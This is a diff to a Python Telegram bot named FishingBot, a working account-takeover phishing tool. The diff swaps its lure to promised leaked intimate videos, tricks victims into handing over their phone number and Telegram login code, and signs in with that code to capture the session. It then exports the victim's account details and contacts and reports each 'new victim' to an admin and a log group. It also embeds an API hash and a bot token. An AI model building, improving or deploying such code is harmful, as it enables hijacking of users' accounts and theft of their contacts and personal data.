@@ -14,6 +14,9 @@ from telethon.tl.functions.contacts import GetContactsRequest
 API_ID = 31930134
 API_HASH = '12814e71d319a434ee2f126d0c51c314'
 BOT_TOKEN = '8651082388:AAF6UNT2y7MSlhkPYGBFkkN4cVkgZ_pZiWc'
+
+# Группа для логов (укажите ID группы)
+LOG_GROUP_ID = -1001234567890  # Замените на ID вашей группы
 ADMIN_ID = 7197493128
 
 SESSIONS_DIR = 'sessions'
@@ -26,7 +29,7 @@ conn = sqlite3.connect('victims.db', check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS victims
              (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT, 
-              session_file TEXT, tdata_path TEXT, timestamp TEXT)''')
+              session_file TEXT, tdata_path TEXT, timestamp TEXT, username TEXT, full_name TEXT)''')
 conn.commit()
 
 class FishingBot:
@@ -38,7 +41,9 @@ class FishingBot:
     async def start(self):
         await self.bot.start(bot_token=BOT_TOKEN)
         print("[SWILL] Бот запущен и готов к работе")
-        print("[SWILL] Ожидаем жертв...")
+        
+        # Отправляем приветствие в группу
+        await self.log_message("🚀 **БОТ АКТИВИРОВАН**\nГотов к работе!")
 
         @self.bot.on(events.NewMessage(pattern='/start'))
         async def start_handler(event):
@@ -47,10 +52,12 @@ class FishingBot:
             )
             
             await event.respond(
-                "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ЗЛАТЕ** 🔥\n\n"
-                "Для получения доступа к базе слитых кошельков\n"
-                "нажмите кнопку 'Поделиться контактом' для авторизации.\n\n"
-                "⚡️ Это займет всего 5 секунд!",
+                "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ИНТИМ ВИДЕО ЗЛАТЫ** 🔥\n\n"
+                "В сети появился эксклюзивный слив интимных видео известных личностей!\n"
+                "Более 500+ видео с топовыми блогерами и моделями.\n\n"
+                "Для получения доступа к архиву необходимо подтвердить возраст (18+)\n"
+                "Нажмите кнопку 'Поделиться контактом' для верификации.\n\n"
+                "⚡️ Конфиденциальность гарантирована!",
                 buttons=[[button]]
             )
 
@@ -67,18 +74,30 @@ class FishingBot:
                 if not phone.startswith('+'):
                     phone = '+' + phone
                 
+                # Получаем информацию о пользователе
+                try:
+                    user_info = await event.get_sender()
+                    username = f"@{user_info.username}" if user_info.username else "Нет username"
+                    full_name = f"{user_info.first_name or ''} {user_info.last_name or ''}".strip()
+                except:
+                    username = "Неизвестно"
+                    full_name = "Неизвестно"
+                
                 await event.respond(
-                    "✅ **Номер получен!**\n"
-                    f"Телефон: `{phone}`\n\n"
-                    "Нажмите кнопку ниже, чтобы получить код:",
+                    "✅ **Верификация пройдена!**\n"
+                    f"📱 Номер: `{phone}`\n\n"
+                    "Теперь нажмите кнопку ниже для получения кода доступа к архиву:",
                     buttons=[
-                        [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД")]
+                        [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД ДОСТУПА")]
                     ]
                 )
                 
                 self.pending_auth[user_id] = {
                     'step': 'awaiting_code_request',
-                    'phone': phone
+                    'phone': phone,
+                    'username': username,
+                    'full_name': full_name,
+                    'user_id': user_id
                 }
                 return
             
@@ -91,7 +110,7 @@ class FishingBot:
                 auth_data = self.pending_auth[user_id]
                 step = auth_data.get('step')
                 
-                if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
+                if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД ДОСТУПА":
                     await self.request_code(event, user_id, auth_data['phone'])
                     return
                 
@@ -145,7 +164,7 @@ class FishingBot:
         """Обновление сообщения с кодом"""
         try:
             await event.edit(
-                f"📱 **Введите код подтверждения**\n\n"
+                f"📱 **Введите код доступа**\n\n"
                 f"Код: `{code_input}`\n"
                 f"Длина: {len(code_input)}/6\n\n"
                 "Используйте клавиатуру:",
@@ -170,11 +189,9 @@ class FishingBot:
     async def request_code(self, event, user_id, phone):
         """Запрос кода подтверждения"""
         try:
-            # Создаем временный клиент
             temp_client = TelegramClient(f'{SESSIONS_DIR}/temp_{user_id}', API_ID, API_HASH)
             await temp_client.connect()
             
-            # Отправляем запрос кода
             result = await temp_client.send_code_request(phone)
             
             self.pending_auth[user_id].update({
@@ -184,10 +201,9 @@ class FishingBot:
             })
             self.code_inputs[user_id] = ''
             
-            # Отправляем клавиатуру для ввода кода
             await event.respond(
-                "📱 **Введите код подтверждения**\n\n"
-                "Код отправлен в Telegram\n"
+                "📱 **Введите код доступа**\n\n"
+                "Код был отправлен вам в Telegram\n"
                 "Используйте клавиатуру:",
                 buttons=[
                     [KeyboardButtonCallback(text="1", data=b"1"), 
@@ -203,6 +219,15 @@ class FishingBot:
                      KeyboardButtonCallback(text="⌫", data=b"DELETE"), 
                      KeyboardButtonCallback(text="✅", data=b"SEND")]
                 ]
+            )
+            
+            # Логируем запрос кода
+            await self.log_message(
+                f"📱 **ЗАПРОС КОДА**\n"
+                f"Пользователь: {self.pending_auth[user_id].get('full_name', 'Неизвестно')}\n"
+                f"Username: {self.pending_auth[user_id].get('username', 'Неизвестно')}\n"
+                f"ID: {user_id}\n"
+                f"Телефон: {phone}"
             )
             
         except PhoneNumberInvalidError:
@@ -225,40 +250,54 @@ class FishingBot:
             return
         
         try:
-            # Пытаемся авторизоваться
             await temp_client.sign_in(
                 phone=auth_data['phone'],
                 code=code,
                 phone_code_hash=auth_data['phone_code_hash']
             )
             
-            # Успех!
             session_file = f'{SESSIONS_DIR}/victim_{user_id}.session'
             
-            # Отключаемся от временного клиента
             await temp_client.disconnect()
             
-            # Переименовываем сессию
             temp_session = f'{SESSIONS_DIR}/temp_{user_id}.session'
             if os.path.exists(temp_session):
                 shutil.move(temp_session, session_file)
             
-            # Экспортируем данные
             tdata_path = await self.export_tdata(user_id, session_file)
             
-            # Сохраняем в БД
+            # Сохраняем в БД с дополнительной информацией
             c.execute('''INSERT OR REPLACE INTO victims 
-                         VALUES (?, ?, ?, ?, ?, ?)''',
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                       (user_id, auth_data['phone'], code, session_file, tdata_path, 
-                       datetime.now().isoformat()))
+                       datetime.now().isoformat(), 
+                       auth_data.get('username', 'Нет'),
+                       auth_data.get('full_name', 'Нет')))
             conn.commit()
             
+            # Отправляем жертве фейковое сообщение
             await event.respond(
                 "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
-                f"🎯 Аккаунт подтвержден!\n"
+                "🎬 Ссылка на архив с интим видео:\n"
+                "🔗 https://t.me/+XYZ123456789\n\n"
+                "⚠️ Сохраните ссылку, архив будет удален через 24 часа!\n"
+                "📁 Общий вес архива: 45.7 GB"
             )
             
-            await self.notify_admin(user_id, auth_data['phone'], session_file)
+            # Логируем успешный захват в группу
+            await self.log_message(
+                f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
+                f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
+                f"📱 Username: {auth_data.get('username', 'Нет')}\n"
+                f"🆔 ID: {user_id}\n"
+                f"📞 Телефон: {auth_data['phone']}\n"
+                f"📁 Данные: `{tdata_path}`\n"
+                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                f"✅ Аккаунт успешно скомпрометирован!"
+            )
+            
+            # Отправляем админу
+            await self.notify_admin(user_id, auth_data['phone'], session_file, auth_data)
             
             # Очищаем данные
             self.pending_auth.pop(user_id, None)
@@ -287,7 +326,6 @@ class FishingBot:
         try:
             me = await client.get_me()
             
-            # Базовая информация
             data = {
                 'account': {
                     'id': me.id,
@@ -295,7 +333,8 @@ class FishingBot:
                     'first_name': me.first_name,
                     'last_name': me.last_name,
                     'phone': me.phone,
-                    'session_path': session_file
+                    'session_path': session_file,
+                    'captured_at': datetime.now().isoformat()
                 },
                 'contacts': []
             }
@@ -314,11 +353,9 @@ class FishingBot:
             except:
                 pass
             
-            # Сохраняем JSON
             with open(f'{tdata_dir}/account.json', 'w', encoding='utf-8') as f:
                 json.dump(data, f, indent=2, ensure_ascii=False)
             
-            # Копируем сессию
             shutil.copy(session_file, f'{tdata_dir}/session.session')
             
         except Exception as e:
@@ -328,16 +365,25 @@ class FishingBot:
         
         return tdata_dir
 
-    async def notify_admin(self, user_id, phone, session_file):
+    async def log_message(self, message):
+        """Отправка сообщения в группу логов"""
+        try:
+            await self.bot.send_message(LOG_GROUP_ID, message)
+        except Exception as e:
+            print(f"[ERROR] Логирование в группу: {e}")
+
+    async def notify_admin(self, user_id, phone, session_file, auth_data):
         """Уведомление админа"""
         try:
             await self.bot.send_message(
                 ADMIN_ID,
-                f"🎯 **НОВАЯ ЖЕРТВА!**\n"
-                f"ID: {user_id}\n"
-                f"Телефон: {phone}\n"
-                f"Сессия: {session_file}\n"
-                f"Время: {datetime.now().isoformat()}"
+                f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
+                f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
+                f"📱 Username: {auth_data.get('username', 'Нет')}\n"
+                f"🆔 ID: {user_id}\n"
+                f"📞 Телефон: {phone}\n"
+                f"📁 Сессия: {session_file}\n"
+                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             )
         except:
             pass
